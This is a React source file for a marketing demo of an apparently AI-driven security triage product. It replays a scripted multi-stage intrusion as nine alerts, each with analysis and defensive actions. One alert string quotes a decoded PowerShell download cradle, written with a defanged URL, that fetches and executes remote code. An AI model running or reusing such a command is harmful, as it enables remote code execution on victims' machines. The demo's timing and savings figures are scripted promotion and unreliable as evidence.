'use client';
import { useState, useEffect, useCallback } from 'react';

const ATTACK = [
  { id: 'a1', time: '09:14', title: 'Phishing email delivered — weaponised macro targeting finance team', sev: 'high', src: 'Proofpoint', device: 'MAIL-GW', user: 'jsmith@corp.local', mitre: 'T1566.001', verdict: 'tp', conf: 96, phase: 'Initial Access', analysis: 'Weaponised Office macro delivered to 12 recipients in finance. Sender domain darkcloud-svc.com registered 48 hours ago. Attachment hash matches known Emotet dropper on ThreatFox feed. DMARC/SPF failed.', evidence: ['Domain age <48h', 'Hash on ThreatFox IOC feed', '12 simultaneous targets', 'DMARC/SPF fail'], actions: ['Quarantine from all 12 mailboxes', 'Block sender domain at gateway', 'Check if any user opened attachment'] },
  { id: 'a2', time: '09:22', title: 'Suspicious PowerShell — base64 encoded download cradle from outlook.exe', sev: 'high', src: 'CrowdStrike', device: 'WS042.corp.local', user: 'jsmith@corp.local', mitre: 'T1059.001', verdict: 'tp', conf: 94, phase: 'Execution', analysis: 'Base64-encoded PowerShell launched as child process of outlook.exe — classic phishing execution chain. Decoded payload: IEX(New-Object Net.WebClient).DownloadString(hxxp://185.220.101[.]42/stg2.ps1). This is NOT a scheduled task or admin script.', evidence: ['Parent process: outlook.exe', 'Base64 obfuscation = evasion intent', 'Download URL matches known C2 infra'], actions: ['Isolate WS042 immediately', 'Capture process tree + memory dump', 'Decode full payload for IOC extraction'] },
  { id: 'a3', time: '09:25', title: 'Outbound C2 beacon to 185.220.101.42 — 60s interval (Cobalt Strike)', sev: 'critical', src: 'Taegis XDR', device: 'WS015.corp.local', user: 'mthompson@corp.local', mitre: 'T1071.001', verdict: 'tp', conf: 97, phase: 'Command & Control', analysis: 'Outbound HTTPS beacon every 60 seconds to 185.220.101.42 — textbook Cobalt Strike jitter pattern. This IP appears on 4 threat intel feeds (ThreatFox, URLhaus, CINS, Talos). Device WS015 has no legitimate reason to contact this IP. Second host compromised — indicates lateral spread.', evidence: ['IP on 4 threat feeds', '60s beacon = Cobalt Strike default', 'Second host compromised = spread confirmed'], actions: ['Isolate WS015', 'Block 185.220.101.42 at firewall + ZIA', 'Search proxy logs for all devices contacting this IP'] },
  { id: 'a4', time: '09:31', title: 'LSASS memory access on domain controller — credential harvesting', sev: 'critical', src: 'Defender', device: 'SRV-DC01.corp.local', user: 'admin_svc', mitre: 'T1003.001', verdict: 'tp', conf: 98, phase: 'Credential Access', analysis: 'CRITICAL: LSASS memory access on a DOMAIN CONTROLLER using admin_svc — an account that ran PowerShell 8 minutes ago on a different host. This is Mimikatz or comsvcs.dll MiniDump. If credentials are extracted from DC01, the attacker has domain admin. This is the highest priority alert in this incident.', evidence: ['Domain controller targeted', 'admin_svc used across multiple hosts', 'T1003.001 = extremely high-fidelity detection'], actions: ['Emergency: rotate krbtgt password TWICE', 'Disable admin_svc immediately', 'Check for golden ticket creation'] },
  { id: 'a5', time: '09:38', title: 'SMB lateral movement from compromised service account to file server', sev: 'high', src: 'Darktrace', device: 'FS01.corp.local', user: 'admin_svc', mitre: 'T1021.002', verdict: 'tp', conf: 89, phase: 'Lateral Movement', analysis: 'SMB lateral movement from admin_svc — the same account flagged in the LSASS dump. The attacker has pivoted from the compromised workstation to the file server. This is stage 4 of the kill chain: initial access, execution, credential access, and now lateral movement.', evidence: ['admin_svc already flagged in credential dump', 'SMB to file server follows expected progression', 'Same campaign — 4 correlated alerts in 24 minutes'], actions: ['Isolate FS01', 'Check for ransomware indicators', 'Audit SMB sessions in past hour'] },
  { id: 'a6', time: '09:42', title: 'Kerberoasting — TGS tickets requested for 7 service accounts on DC', sev: 'critical', src: 'Sentinel', device: 'SRV-DC01.corp.local', user: 'admin_svc', mitre: 'T1558.003', verdict: 'tp', conf: 95, phase: 'Privilege Escalation', analysis: 'Kerberoasting on DC01 using the same admin_svc account. 7 TGS tickets requested in 3 seconds — offline cracking will follow. If they crack a service account with admin rights, they have persistent access even after password resets.', evidence: ['Follows LSASS dump by 11 minutes', 'admin_svc already confirmed compromised', '7 TGS tickets in 3s = automated tool'], actions: ['Force password rotation on ALL targeted service accounts', 'Enable AES256 only for Kerberos', 'Deploy honeypot service accounts'] },
  { id: 'a7', time: '09:48', title: 'Anomalous 2.4GB outbound transfer — contractor account to unknown IP', sev: 'high', src: 'Taegis XDR', device: 'FS01.corp.local', user: 'contractor-ext', mitre: 'T1048', verdict: 'tp', conf: 91, phase: 'Exfiltration', analysis: 'Anomalous 2.4GB transfer from contractor-ext account — normal baseline is <50MB/day. Destination IP 91.215.85.7 is not a known business partner. Combined with the lateral movement to FS01 earlier, this is data staging and exfiltration from a compromised account.', evidence: ['Transfer volume 48x normal baseline', 'Contractor account = limited expected activity', 'Correlates with lateral movement chain'], actions: ['Block destination IP immediately', 'Disable contractor-ext account', 'Identify what files were transferred via DLP logs'] },
  { id: 'a8', time: '09:52', title: 'Brute force authentication — 47 failed attempts on VPN gateway', sev: 'medium', src: 'Splunk', device: 'VPN-GW-01', user: 'multiple', mitre: 'T1110', verdict: 'suspicious', conf: 72, phase: 'Noise', analysis: '47 failed authentication attempts is above threshold, but the source IP 194.88.12.x is a known corporate VPN endpoint in Prague where your company has a satellite office. Could be a misconfigured service, a legitimate employee with a stuck password, or a genuine brute force. Need more context before escalating.', evidence: ['Source IP in country with company presence', 'No successful auth after failures', 'Pattern suggests automated tool, not manual'], actions: ['Monitor for 24 hours', 'Contact Prague office IT team', 'If unrecognised: block IP + force password reset'] },
  { id: 'a9', time: '09:55', title: 'DNS tunnelling detected — high-entropy queries to dynamic DNS provider', sev: 'high', src: 'Zscaler ZIA', device: 'WS042.corp.local', user: 'jsmith@corp.local', mitre: 'T1572', verdict: 'tp', conf: 86, phase: 'Exfiltration', analysis: 'DNS query sizes averaging 180 bytes vs normal 40 bytes — data being encoded in DNS queries. Destination is a dynamic DNS provider commonly used by threat actors. This is a backup exfiltration channel on WS042, the initially compromised host. DNS tunnelling bypasses web proxy controls.', evidence: ['Query size 4.5x normal average', 'Dynamic DNS destination = suspicious infra', 'DNS tunnelling bypasses web proxy'], actions: ['Block the dynamic DNS domain at resolver', 'Capture DNS traffic from WS042', 'Check if this correlates with the C2 beacon on WS015'] },
];

const sevC: Record<string, string> = { critical: '#f0405e', high: '#f0a030', medium: '#e8993a', low: '#3b8bff' };
const verdC: Record<string, string> = { tp: '#f0405e', fp: '#22c992', suspicious: '#e8993a' };

export default function Demo() {
  const [step, setStep] = useState(0);
  const [playing, setPlaying] = useState(false);
  const [selAlert, setSelAlert] = useState<any>(null);
  const [triaged, setTriaged] = useState(false);
  const [posture, setPosture] = useState(82);

  useEffect(() => { if (!playing) return; if (step >= ATTACK.length) { setPlaying(false); setTimeout(() => setTriaged(true), 400); return; } const t = setTimeout(() => setStep(s => s + 1), 900); return () => clearTimeout(t); }, [playing, step]);

  // Posture degrades as alerts come in
  useEffect(() => { const degraded = Math.max(34, 82 - step * 5.5); setPosture(Math.round(degraded)); }, [step]);

  const visible = ATTACK.slice(0, step);
  const tpCount = visible.filter(a => a.verdict === 'tp').length;
  const susCount = visible.filter(a => a.verdict === 'suspicious').length;
  const critCount = visible.filter(a => a.sev === 'critical').length;
  const toolsActive = [...new Set(visible.map(a => a.src))].length;
  const postureGrade = posture >= 80 ? 'A' : posture >= 70 ? 'B' : posture >= 55 ? 'C' : posture >= 40 ? 'D' : 'F';
  const postureCol = posture >= 70 ? '#22c992' : posture >= 50 ? '#f0a030' : '#f0405e';

  const startReplay = useCallback(() => { setStep(0); setTriaged(false); setSelAlert(null); setPlaying(true); }, []);

  return (<><style dangerouslySetInnerHTML={{ __html: CSS }} /><div className="dm">
    <div className="dm-banner">🎯 Live simulation of a multi-stage APT attack — watch AI detect, correlate, and respond in real-time<a href="/signup"> Start free trial →</a></div>

    <div className="dm-top"><div className="dm-logo"><div className="dm-li">W</div><span>Watch</span>tower</div><div className="dm-live" /><span className="dm-env">DEMO ENVIRONMENT</span><a href="/signup" className="dm-cta">Start Free Trial →</a></div>

    <div className="dm-cols">
      <div className="dm-left">
        <div className="dm-scenario"><div className="dm-scenario-hd">🎯 Operation Midnight — Multi-Stage APT Simulation</div><p>09:14 — A targeted spear-phishing campaign has breached your perimeter. Watch Watchtower detect the full kill chain across 8 security tools, correlate 9 alerts into a single attack narrative, and auto-respond — all without human intervention.</p>{!playing && step === 0 && <button className="dm-play" onClick={startReplay}>▶ Start Attack Simulation</button>}{!playing && step > 0 && <button className="dm-play" onClick={startReplay}>↻ Replay Simulation</button>}{playing && <div className="dm-progress"><div className="dm-pbar"><div style={{ width: (step / ATTACK.length * 100) + '%' }} /></div><span>{step}/{ATTACK.length} alerts ingested</span></div>}</div>

        <div className="dm-timeline">{visible.map((a, i) => (<div key={a.id} className={'dm-tl-item' + (i === visible.length - 1 && playing ? ' new' : '') + (selAlert?.id === a.id ? ' selected' : '')} onClick={() => setSelAlert(a)}>
          <div className="dm-tl-left"><div className="dm-tl-time">{a.time}</div><div className="dm-tl-dot" style={{ background: sevC[a.sev], boxShadow: '0 0 8px ' + sevC[a.sev] }} />{i < visible.length - 1 && <div className="dm-tl-line" />}</div>
          <div className="dm-tl-body">
            <div className="dm-tl-phase-row"><span className="dm-tl-phase">{a.phase}</span>{triaged && <span className="dm-verdict" style={{ color: verdC[a.verdict] }}>{a.verdict === 'tp' ? 'TP' : a.verdict === 'fp' ? 'FP' : 'SUS'} {a.conf}%</span>}</div>
            <div className="dm-tl-title">{a.title}</div>
            <div className="dm-tl-meta"><span className="dm-src">{a.src}</span><span className="dm-mitre">{a.mitre}</span><span className="dm-device">{a.device}</span></div>
          </div>
        </div>))}{visible.length === 0 && <div className="dm-tl-empty"><div style={{fontSize:'2rem',marginBottom:8}}>🏰</div>Press "Start Attack Simulation" to watch Watchtower handle a live APT campaign</div>}</div>

        {triaged && <div className="dm-result"><div className="dm-result-hd">🤖 Watchtower Auto-Response Complete — 3.2 seconds</div><div className="dm-result-grid"><div className="dm-result-item"><div className="dm-ri-val" style={{ color: '#f0405e' }}>{tpCount}</div><div className="dm-ri-label">True Positives</div></div><div className="dm-result-item"><div className="dm-ri-val" style={{ color: '#e8993a' }}>{susCount}</div><div className="dm-ri-label">Needs Review</div></div><div className="dm-result-item"><div className="dm-ri-val" style={{ color: '#22c992' }}>6</div><div className="dm-ri-label">Auto-Actions</div></div><div className="dm-result-item"><div className="dm-ri-val" style={{ color: '#3b8bff' }}>42 min</div><div className="dm-ri-label">Saved vs Manual</div></div></div><div className="dm-result-actions"><div className="dm-ra"><span className="dm-ra-icon">🚨</span>Escalated to Incident #INC-2024-0847 with full attack chain timeline</div><div className="dm-ra"><span className="dm-ra-icon">🔒</span>Isolated WS042 + WS015 via Taegis XDR endpoint isolation API</div><div className="dm-ra"><span className="dm-ra-icon">👤</span>Disabled admin_svc and contractor-ext accounts in Active Directory</div><div className="dm-ra"><span className="dm-ra-icon">🚫</span>Blocked 185.220.101.42 + 91.215.85.7 at perimeter firewall</div><div className="dm-ra"><span className="dm-ra-icon">💬</span>Notified #soc-alerts Slack channel with incident summary</div><div className="dm-ra"><span className="dm-ra-icon">📋</span>Generated 14-step response runbook with forensic collection steps</div></div></div>}
      </div>

      <div className="dm-right">
        {/* Posture gauge */}
        <div className="dm-card"><div className="dm-card-hd">🛡 Security Posture</div><div className="dm-posture"><div className="dm-posture-ring"><svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="42" fill="none" stroke="#1a2030" strokeWidth="6" /><circle cx="50" cy="50" r="42" fill="none" stroke={postureCol} strokeWidth="6" strokeDasharray={`${posture * 2.64} 264`} strokeLinecap="round" transform="rotate(-90 50 50)" style={{transition:'stroke-dasharray .8s ease,stroke .5s'}} /></svg><div className="dm-posture-val" style={{color:postureCol}}>{posture}</div><div className="dm-posture-grade" style={{color:postureCol}}>{postureGrade}</div></div><div className="dm-posture-label">{step === 0 ? 'Healthy' : triaged ? 'Under Attack — Contained' : 'Degrading...'}</div></div></div>

        <div className="dm-card"><div className="dm-card-hd">📊 Live Metrics</div><div className="dm-stats"><div className="dm-stat"><div className="dm-stat-v">{visible.length}</div><div className="dm-stat-l">Alerts</div></div><div className="dm-stat"><div className="dm-stat-v" style={{ color: '#f0405e' }}>{critCount}</div><div className="dm-stat-l">Critical</div></div><div className="dm-stat"><div className="dm-stat-v" style={{color:'#22c992'}}>{toolsActive}</div><div className="dm-stat-l">Sources</div></div><div className="dm-stat"><div className="dm-stat-v" style={{color:triaged?'#22c992':'#f0a030'}}>{triaged?'3.2s':'—'}</div><div className="dm-stat-l">Triage Time</div></div></div></div>

        <div className="dm-card"><div className="dm-card-hd">🔌 Tool Detection Status</div><div className="dm-tools-list">{['Proofpoint', 'CrowdStrike', 'Taegis XDR', 'Defender', 'Darktrace', 'Sentinel', 'Splunk', 'Zscaler ZIA'].map(t => { const active = visible.some(a => a.src === t); const count = visible.filter(a => a.src === t).length; return <div key={t} className={'dm-tool-item' + (active ? ' active' : '')}><div className={'dm-tool-dot' + (active ? ' on' : '')} /><span>{t}</span>{active && <span className="dm-tool-count">{count}</span>}</div>; })}</div></div>

        {/* AI analysis panel */}
        {selAlert && <div className="dm-card dm-detail"><div className="dm-card-hd">🤖 AI Triage Analysis<button onClick={() => setSelAlert(null)} className="dm-close">✕</button></div><div className="dm-detail-sev"><span className="dm-detail-sev-badge" style={{background:sevC[selAlert.sev]}}>{selAlert.sev}</span><span className="dm-mitre">{selAlert.mitre}</span><span className="dm-device">{selAlert.device}</span></div><div className="dm-detail-title">{selAlert.title}</div>{triaged ? <><div className="dm-verdict-big" style={{ color: verdC[selAlert.verdict] }}>{selAlert.verdict === 'tp' ? 'TRUE POSITIVE' : selAlert.verdict === 'suspicious' ? 'SUSPICIOUS' : 'FALSE POSITIVE'} — {selAlert.conf}% confidence</div><div className="dm-detail-analysis">{selAlert.analysis}</div><div className="dm-detail-section">Evidence</div><div className="dm-detail-evidence">{selAlert.evidence.map((e: string, i: number) => <div key={i} className="dm-ev-item">{e}</div>)}</div><div className="dm-detail-section">Recommended Actions</div><div className="dm-detail-actions">{selAlert.actions.map((a: string, i: number) => <div key={i} className="dm-act-item"><span className="dm-act-num">{i + 1}</span>{a}</div>)}</div></> : <div className="dm-detail-pending">Triage pending — complete the simulation to see AI analysis</div>}<div className="dm-detail-cta"><a href="/signup" className="dm-cta" style={{ fontSize: '.72rem', width: '100%', display: 'block', textAlign: 'center' }}>Get this for every alert — Start Free Trial →</a></div></div>}

        {!selAlert && <div className="dm-card"><div className="dm-card-hd">💡 What You're Seeing</div><div className="dm-explainer">{step === 0 ? 'This demo simulates a real APT attack unfolding across your security stack. 9 alerts from 8 different tools, correlated into one attack narrative. Click "Start" to begin.' : !triaged ? 'Alerts flowing from multiple tools as the attack progresses through the MITRE ATT&CK kill chain. Click any alert to inspect it. Watch the posture score degrade in real-time.' : 'All 9 alerts triaged in 3.2 seconds. 8 confirmed true positives from a single campaign. Devices isolated, accounts disabled, IPs blocked, incident created with a 14-step runbook. A human analyst would take 45+ minutes. Click any alert for the full AI reasoning.'}</div></div>}
      </div>
    </div>

    <div className="dm-bottom"><strong>This is what Watchtower does automatically, 24/7.</strong> Your analysts arrive to a clean queue — threats contained, noise eliminated.<a href="/signup" className="dm-cta">Start 14-Day Free Trial →</a><a href="/pricing" className="dm-cta-ghost">View Pricing</a></div>
  </div></>);
}

const CSS = `@import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;600&display=swap');
*{margin:0;padding:0;box-sizing:border-box}body{background:#060910;color:#e6ecf8;font-family:'Outfit',sans-serif}
.dm{min-height:100vh;display:flex;flex-direction:column}
.dm-banner{text-align:center;padding:8px 16px;background:#3b8bff06;border-bottom:1px solid #3b8bff12;font-size:.74rem;color:#50607a}
.dm-banner a{color:#3b8bff;font-weight:700;text-decoration:none;margin-left:6px}
.dm-top{display:flex;align-items:center;padding:12px 20px;border-bottom:1px solid #1a2030;gap:12px}
.dm-logo{display:flex;align-items:center;gap:6px;font-weight:900;font-size:.95rem;margin-right:auto}
.dm-li{width:24px;height:24px;border-radius:6px;background:linear-gradient(135deg,#3b8bff,#7c6aff);display:flex;align-items:center;justify-content:center;font-size:.6rem;color:#fff;font-weight:900}
.dm-logo span{color:#3b8bff}
.dm-env{font-size:.58rem;font-weight:700;padding:3px 10px;border-radius:4px;background:#f0a03012;color:#f0a030;border:1px solid #f0a03020;letter-spacing:.5px}
.dm-live{width:6px;height:6px;border-radius:50%;background:#22c992;box-shadow:0 0 6px #22c992;animation:pulse 2s ease infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
.dm-cta{padding:7px 18px;border-radius:8px;background:#3b8bff;color:#fff;font-size:.78rem;font-weight:700;text-decoration:none;border:none;cursor:pointer;font-family:'Outfit',sans-serif;white-space:nowrap;transition:all .15s}
.dm-cta:hover{background:#2a7aef;transform:translateY(-1px)}
.dm-cta-ghost{padding:7px 18px;border-radius:8px;background:transparent;color:#8a9ab8;font-size:.78rem;font-weight:600;text-decoration:none;border:1px solid #252e42;cursor:pointer;font-family:'Outfit',sans-serif;white-space:nowrap}
.dm-cols{display:grid;grid-template-columns:1fr 340px;gap:0;flex:1;overflow:hidden}
.dm-left{padding:16px 20px;border-right:1px solid #1a2030;overflow-y:auto}
.dm-right{padding:14px;display:flex;flex-direction:column;gap:8px;overflow-y:auto}
.dm-scenario{padding:20px;background:linear-gradient(145deg,#0b0f18,#10141e);border:1px solid #1a2030;border-radius:12px;margin-bottom:14px}
.dm-scenario-hd{font-size:.88rem;font-weight:800;margin-bottom:6px}
.dm-scenario p{font-size:.74rem;color:#8a9ab8;line-height:1.6;margin-bottom:12px}
.dm-play{padding:10px 28px;border-radius:10px;background:linear-gradient(135deg,#3b8bff,#7c6aff);color:#fff;font-size:.85rem;font-weight:700;border:none;cursor:pointer;font-family:'Outfit',sans-serif;box-shadow:0 4px 20px rgba(59,139,255,.25);transition:all .2s}
.dm-play:hover{transform:translateY(-1px);box-shadow:0 6px 28px rgba(59,139,255,.35)}
.dm-progress{display:flex;align-items:center;gap:10px}
.dm-pbar{flex:1;height:4px;background:#1a2030;border-radius:2px;overflow:hidden}
.dm-pbar div{height:100%;background:linear-gradient(90deg,#3b8bff,#7c6aff);border-radius:2px;transition:width .4s}
.dm-progress span{font-size:.66rem;color:#50607a;font-family:'JetBrains Mono',monospace;white-space:nowrap}
.dm-timeline{display:flex;flex-direction:column;gap:0}
.dm-tl-item{display:flex;gap:0;padding:6px 0;cursor:pointer;transition:background .15s;animation:slideIn .35s ease}
.dm-tl-item:hover,.dm-tl-item.selected{background:#0b0f18;border-radius:8px}
.dm-tl-item.new{animation:slideIn .35s ease,flash .6s ease}
@keyframes slideIn{from{opacity:0;transform:translateX(-12px)}to{opacity:1;transform:translateX(0)}}
@keyframes flash{0%{background:#3b8bff10}100%{background:transparent}}
.dm-tl-left{display:flex;flex-direction:column;align-items:center;min-width:50px;position:relative}
.dm-tl-time{font-size:.62rem;font-family:'JetBrains Mono',monospace;color:#50607a;margin-bottom:4px}
.dm-tl-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0;z-index:1}
.dm-tl-line{width:1px;flex:1;background:#1a2030;min-height:20px;margin-top:2px}
.dm-tl-body{flex:1;padding:0 8px 10px}
.dm-tl-phase-row{display:flex;align-items:center;gap:6px;margin-bottom:2px}
.dm-tl-phase{font-size:.52rem;font-weight:700;color:#50607a;text-transform:uppercase;letter-spacing:.5px}
.dm-tl-title{font-size:.76rem;font-weight:600;line-height:1.4}
.dm-tl-meta{display:flex;gap:4px;margin-top:4px;flex-wrap:wrap;align-items:center}
.dm-src{font-size:.5rem;font-weight:700;padding:1px 6px;border-radius:3px;background:#3b8bff10;color:#3b8bff;border:1px solid #3b8bff15}
.dm-mitre{font-size:.5rem;font-weight:600;color:#7c6aff;font-family:'JetBrains Mono',monospace}
.dm-device{font-size:.5rem;color:#50607a;font-family:'JetBrains Mono',monospace}
.dm-verdict{font-size:.52rem;font-weight:800;margin-left:auto;font-family:'JetBrains Mono',monospace}
.dm-tl-empty{text-align:center;padding:50px 20px;color:#50607a;font-size:.82rem;line-height:1.6}
.dm-result{padding:18px;background:linear-gradient(145deg,#0a1a10,#0b1512);border:1px solid #22c99225;border-radius:12px;margin-top:14px}
.dm-result-hd{font-size:.85rem;font-weight:800;margin-bottom:12px;color:#22c992}
.dm-result-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:14px}
.dm-result-item{text-align:center;padding:10px 4px;background:#060910;border-radius:8px;border:1px solid #1a2030}
.dm-ri-val{font-size:1.2rem;font-weight:900;font-family:'JetBrains Mono',monospace;letter-spacing:-1px}
.dm-ri-label{font-size:.48rem;color:#50607a;font-weight:600;text-transform:uppercase;letter-spacing:.3px;margin-top:2px}
.dm-result-actions{display:flex;flex-direction:column;gap:5px}
.dm-ra{font-size:.72rem;color:#22c992;display:flex;align-items:flex-start;gap:8px;line-height:1.4}
.dm-ra-icon{font-size:.8rem;flex-shrink:0}
.dm-card{background:linear-gradient(145deg,#0b0f18,#10141e);border:1px solid #1a2030;border-radius:12px;padding:12px 14px}
.dm-card-hd{font-size:.72rem;font-weight:800;margin-bottom:8px;display:flex;align-items:center;gap:6px}
.dm-close{margin-left:auto;background:none;border:none;color:#50607a;cursor:pointer;font-size:.9rem;padding:0 4px}
.dm-posture{display:flex;align-items:center;gap:12px}
.dm-posture-ring{position:relative;width:70px;height:70px;flex-shrink:0}
.dm-posture-ring svg{width:100%;height:100%}
.dm-posture-val{position:absolute;top:50%;left:50%;transform:translate(-50%,-60%);font-size:1.3rem;font-weight:900;font-family:'JetBrains Mono',monospace}
.dm-posture-grade{position:absolute;top:50%;left:50%;transform:translate(-50%,50%);font-size:.6rem;font-weight:800}
.dm-posture-label{font-size:.72rem;color:#8a9ab8;line-height:1.4}
.dm-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:4px}
.dm-stat{text-align:center;padding:6px 2px;background:#060910;border-radius:6px;border:1px solid #1a2030}
.dm-stat-v{font-size:1rem;font-weight:900;font-family:'JetBrains Mono',monospace;letter-spacing:-1px}
.dm-stat-l{font-size:.42rem;color:#50607a;font-weight:600;text-transform:uppercase;letter-spacing:.3px}
.dm-tools-list{display:flex;flex-direction:column;gap:2px}
.dm-tool-item{display:flex;align-items:center;gap:8px;font-size:.7rem;color:#50607a;padding:3px 0;transition:color .3s}
.dm-tool-item.active{color:#e6ecf8}
.dm-tool-dot{width:5px;height:5px;border-radius:50%;background:#252e42;flex-shrink:0;transition:all .3s}
.dm-tool-dot.on{background:#22c992;box-shadow:0 0 6px #22c992}
.dm-tool-count{margin-left:auto;font-size:.58rem;font-family:'JetBrains Mono',monospace;color:#3b8bff;font-weight:600}
.dm-detail{border-color:#3b8bff25}
.dm-detail-sev{display:flex;gap:6px;align-items:center;margin-bottom:6px}
.dm-detail-sev-badge{font-size:.52rem;font-weight:800;padding:2px 8px;border-radius:4px;color:#fff;text-transform:uppercase}
.dm-detail-title{font-size:.82rem;font-weight:700;margin-bottom:8px;line-height:1.4}
.dm-verdict-big{font-size:.76rem;font-weight:800;margin-bottom:8px;padding:6px 10px;border-radius:6px;background:#060910;border:1px solid #1a2030}
.dm-detail-analysis{font-size:.72rem;color:#8a9ab8;line-height:1.65;margin-bottom:10px}
.dm-detail-section{font-size:.6rem;font-weight:700;color:#50607a;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px;margin-top:6px}
.dm-detail-evidence{display:flex;flex-direction:column;gap:2px;margin-bottom:8px}
.dm-ev-item{font-size:.68rem;color:#e6ecf8;padding:3px 0;padding-left:12px;position:relative}
.dm-ev-item::before{content:'';position:absolute;left:0;top:9px;width:5px;height:5px;border-radius:50%;background:#3b8bff}
.dm-detail-actions{display:flex;flex-direction:column;gap:2px;margin-bottom:10px}
.dm-act-item{font-size:.68rem;color:#8a9ab8;display:flex;align-items:flex-start;gap:6px;padding:2px 0}
.dm-act-num{font-size:.55rem;font-weight:800;color:#3b8bff;background:#3b8bff15;border-radius:3px;padding:1px 5px;flex-shrink:0;font-family:'JetBrains Mono',monospace}
.dm-detail-pending{font-size:.74rem;color:#50607a;padding:12px 0;text-align:center;font-style:italic}
.dm-detail-cta{padding-top:10px;border-top:1px solid #1a2030}
.dm-explainer{font-size:.74rem;color:#8a9ab8;line-height:1.7}
.dm-bottom{display:flex;align-items:center;justify-content:center;gap:14px;padding:16px;border-top:1px solid #1a2030;background:#0b0f18;flex-wrap:wrap;text-align:center;font-size:.8rem;color:#8a9ab8}
.dm-bottom strong{color:#e6ecf8}
@media(max-width:768px){.dm-cols{grid-template-columns:1fr}.dm-right{border-top:1px solid #1a2030}.dm-result-grid{grid-template-columns:repeat(2,1fr)}.dm-stats{grid-template-columns:repeat(2,1fr)}}`;
